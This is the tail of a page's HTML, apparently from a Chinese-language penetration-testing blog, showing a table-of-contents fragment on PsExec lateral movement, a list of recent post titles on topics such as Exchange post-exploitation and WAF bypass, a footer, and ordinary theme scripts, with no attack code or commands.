href="#PSEXEC%E6%A8%AA%E5%90%91"><span class="toc-number">3.7.</span> <span class="toc-text">PSEXEC横向</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/12/exchange/" title="exchange后渗透"><img src="/img/covers/shinchan-cover-10.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="exchange后渗透"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/12/exchange/" title="exchange后渗透">exchange后渗透</a><time datetime="2026-02-12T03:07:31.518Z" title="发表于 2026-02-12 11:07:31">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/11/nw2/" title="内网横向移动"><img src="/img/covers/shinchan-cover-09.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网横向移动"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/11/nw2/" title="内网横向移动">内网横向移动</a><time datetime="2026-02-11T07:05:56.849Z" title="发表于 2026-02-11 15:05:56">2026-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/sd/" title="内网隧道搭建"><img src="/img/covers/shinchan-cover-08.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网隧道搭建"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/09/sd/" title="内网隧道搭建">内网隧道搭建</a><time datetime="2026-02-09T06:34:08.266Z" title="发表于 2026-02-09 14:34:08">2026-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/web1/" title="web waf绕过"><img src="/img/covers/shinchan-cover-07.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web waf绕过"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/09/web1/" title="web waf绕过">web waf绕过</a><time datetime="2026-02-09T03:10:09.080Z" title="发表于 2026-02-09 11:10:09">2026-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/08/nw/" title="内网凭证窃取"><img src="/img/covers/shinchan-cover-06.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网凭证窃取"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/08/nw/" title="内网凭证窃取">内网凭证窃取</a><time datetime="2026-02-08T07:42:30.210Z" title="发表于 2026-02-08 15:42:30">2026-02-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shinchan-crayon-bg.svg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-friend-links" style="margin-top:14px;display:flex;justify-content:center;"><a class="footer-friend-card" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer" style="display:inline-flex;align-items:center;gap:10px;padding:8px 14px;border:2px solid #2f2a3b;border-radius:12px;background:rgba(255,255,255,0.88);color:#2f2a3b;text-decoration:none;font-weight:700;box-shadow:0 4px 0 rgba(47,42,59,0.18);"><img src="/img/friendlinks/yyyxxx-logo.webp" alt="映雪 Sec Logo" style="width:26px;height:26px;min-width:26px;object-fit:cover;border-radius:6px;display:block;" loading='lazy'><span style="color:#2f2a3b;">映雪安全</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="Nohara,Crayon,Action,Shinchan" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
